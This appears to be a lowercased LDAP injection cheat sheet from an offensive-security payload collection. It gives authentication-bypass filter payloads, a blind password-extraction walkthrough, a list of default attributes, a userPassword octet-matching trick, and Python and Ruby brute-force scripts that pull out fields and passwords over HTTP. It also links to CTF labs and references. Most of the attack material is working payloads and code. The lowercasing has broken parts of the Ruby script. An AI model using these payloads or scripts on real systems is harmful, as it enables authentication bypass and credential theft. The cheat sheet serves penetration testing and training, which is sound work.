# ldap injection

> ldap injection is an attack used to exploit web based applications that construct ldap statements based on user input. when an application fails to properly sanitize user input, it's possible to modify ldap statements using a local proxy.


## summary

* [methodology](#methodology)
    * [authentication bypass](#authentication-bypass)
    * [blind exploitation](#blind-exploitation)
* [defaults attributes](#defaults-attributes)
* [exploiting userpassword attribute](#exploiting-userpassword-attribute)
* [scripts](#scripts)
    * [discover valid ldap fields](#discover-valid-ldap-fields)
    * [special blind ldap injection](#special-blind-ldap-injection)
* [labs](#labs)
* [references](#references)


## methodology

ldap injection is a vulnerability that occurs when user-supplied input is used to construct ldap queries without proper sanitization or escaping

### authentication bypass

attempt to manipulate the filter logic by injecting always-true conditions.

**example 1**: this ldap query exploits logical operators in the query structure to potentially bypass authentication

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userpassword={md5}x03mo1qnzdydgyfeuilpmq==))
```

**example 2**: this ldap query exploits logical operators in the query structure to potentially bypass authentication

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userpassword=q))))
```


### blind exploitation

this scenario demonstrates ldap blind exploitation using a technique similar to binary search or character-based brute-forcing to discover sensitive information like passwords. it relies on the fact that ldap filters respond differently to queries based on whether the conditions match or not, without directly revealing the actual password.

```sql
(&(sn=administrator)(password=*))    : ok
(&(sn=administrator)(password=a*))   : ko
(&(sn=administrator)(password=b*))   : ko
...
(&(sn=administrator)(password=m*))   : ok
(&(sn=administrator)(password=ma*))  : ko
(&(sn=administrator)(password=mb*))  : ko
...
(&(sn=administrator)(password=my*))  : ok
(&(sn=administrator)(password=mya*)) : ko
(&(sn=administrator)(password=myb*)) : ko
(&(sn=administrator)(password=myc*)) : ko
...
(&(sn=administrator)(password=myk*)) : ok
(&(sn=administrator)(password=myke)) : ok
```

**ldap filter breakdown**

* `&`: logical and operator, meaning all conditions inside must be true.
* `(sn=administrator)`: matches entries where the sn (surname) attribute is administrator.
* `(password=x*)`: matches entries where the password starts with x (case-sensitive). the asterisk (*) is a wildcard, representing any remaining characters.


## defaults attributes

can be used in an injection like `*)(attribute_here=*`

```bash
userpassword
surname
name
cn
sn
objectclass
mail
givenname
commonname
```


## exploiting userpassword attribute

`userpassword` attribute is not a string like the `cn` attribute for example but it’s an octet string
in ldap, every object, type, operator etc. is referenced by an oid : octetstringorderingmatch (oid 2.5.13.18).

> octetstringorderingmatch (oid 2.5.13.18): an ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. the first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.

```bash
userpassword:2.5.13.18:=\xx (\xx is a byte)
userpassword:2.5.13.18:=\xx\xx
userpassword:2.5.13.18:=\xx\xx\xx
```

## scripts

### discover valid ldap fields

```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://url.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #like (&(login=*)(iter_val=*))\x00)(password=bla))
    if 'true condition' in r.text:
        fields.append(str(i))

print(fields)
```

### special blind ldap injection

```python
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("true condition" in r.text):
            flag += char
            print("[+] flag: " + flag)
            break
```

exploitation script by [@noraj](https://github.com/noraj)

```ruby
#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'a'..'z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
(0..50).each do |i|
  puts("[i] looking for number #{i}")
  alphabet.each do |char|
    r = net::http.get(uri("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /true condition/.match?(r)
      flag += char
      puts("[+] flag: #{flag}")
      break
    end
  end
end
```


## labs

* [root me - ldap injection - authentication](https://www.root-me.org/en/challenges/web-server/ldap-injection-authentication)
* [root me - ldap injection - blind](https://www.root-me.org/en/challenges/web-server/ldap-injection-blind)


## references

- [[european cyber week] - admysion - alan marrec (maki)](https://www.maki.bzh/writeups/ecw2018admyssion/)
- [ecw 2018 : write up - admyssion (web - 50) - 0xukn - october 31, 2018](https://0xukn.fr/posts/writeupecw2018admyssion/)
- [how to configure openldap and perform administrative ldap tasks - justin ellingwood - may 30, 2015](https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
- [how to manage and use ldap servers with openldap utilities - justin ellingwood - may 29, 2015](https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
- [ldap blind explorer - alonso parada - august 12, 2011](http://code.google.com/p/ldap-blind-explorer/)
- [ldap injection & blind ldap injection - chema alonso, josé parada gimeno - october 10, 2008](https://www.blackhat.com/presentations/bh-europe-08/alonso-parada/whitepaper/bh-eu-08-alonso-parada-wp.pdf)
- [ldap injection prevention cheat sheet - owasp - july 16, 2019](https://www.owasp.org/index.php/ldap_injection)